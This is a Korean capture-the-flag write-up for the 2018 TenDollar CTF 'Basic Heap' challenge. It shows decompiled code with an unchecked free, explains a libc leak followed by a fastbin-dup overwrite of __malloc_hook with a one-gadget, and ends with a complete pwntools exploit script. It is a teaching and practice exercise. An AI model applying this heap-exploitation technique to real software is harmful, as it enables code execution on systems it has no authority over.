---
title: "2018 TenDollar CTF Basic Heap"
date: 2020-2-14
ctf: TenDollar CTF
layout: post
published : false
---

보호기법은 다 걸려있다.

```
[*] '/vagrant/ctfs/2018_TDCTF/pwnable/basic_heap/basicheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

malloc해주는 곳인데 원하는 사이즈만큼 자유자재로 할당할 수 있고 개수는 상관없다.

```c
unsigned __int64 sub_980()
{
  int v0; // ebx
  int v2; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-18h]

  v3 = __readfsqword(0x28u);
  puts("Input Length");
  _isoc99_scanf("%d", &v2);
  v0 = count;
  note[v0] = malloc(v2);
  puts("Input Memo!");
  read(0, note[count], v2);
  ++count;
  puts("Create Note Done.\n");
  return __readfsqword(0x28u) ^ v3;
}
```

free해주는 메뉴인데 원하는 인덱스의 주소를 free해줄 수 있다. 별도의 검사도 없다.

```c
unsigned __int64 sub_AD2()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("Choose Note");
  _isoc99_scanf("%d", &v1);
  free(note[v1]);
  puts("Delete Note Done.\n");
  return __readfsqword(0x28u) ^ v2;
}
```

원하는 인덱스의 청크의 내용을 볼 수 있다.

```c
unsigned __int64 sub_A59()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("Choose Note");
  _isoc99_scanf("%d", &v1);
  puts(note[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

fastbin dup에 이용하기 위해 fastbin 2개 생성하고 small bin을 생성한 후 fastbin을 하나 더 생성해서 top chunk와 병합되지 않게한 후 small bin을 free후 leak한 후 libc주소 구해주고 __malloc_hook-35 위치에 fake chunk을 생성해서 fastbin dup으로 oneshot주소로 덮어준 후 malloc 해주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./basicheap')
p = process('./basicheap')
libc = e.libc
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def create(length,content):
	sla('4. Quit\n','1')
	sla('Input Length\n',str(length))
	sa('Input Memo!\n',content)

def show(index):
	sla('4. Quit\n','2')
	sla('Choose Note\n',str(index))

def delete(index):
	sla('4. Quit\n','3')
	sla('Choose Note\n',str(index))

def quit():
	sla('4. Quit\n','4')

create(0x60,'AAAA')
create(0x60,'BBBB')
create(180,'CCCC') # unsorted bin attack
create(0x60,'DDDD')

delete(2)
show(2)

main_arena = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
log.info('main_arena : {}'.format(hex(main_arena)))
libc_base = main_arena - 0x3c4b78
log.info('libc_base : {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info('__malloc_hook : {}'.format(hex(malloc_hook)))
oneshot = libc_base + 0xf1147
log.info('oneshot : {}'.format(hex(oneshot)))

create(180,'EEEE')

# fastbin dup
delete(0)
delete(1)
delete(0)

create(0x60,p64(malloc_hook-35)) # fake chunk
create(0x60,'FFFF')
create(0x60,'FFFF')
create(0x60,'A'*19+p64(oneshot))

sla('4. Quit\n','1')
sla('Input Length\n',str(50))

p.interactive()
```

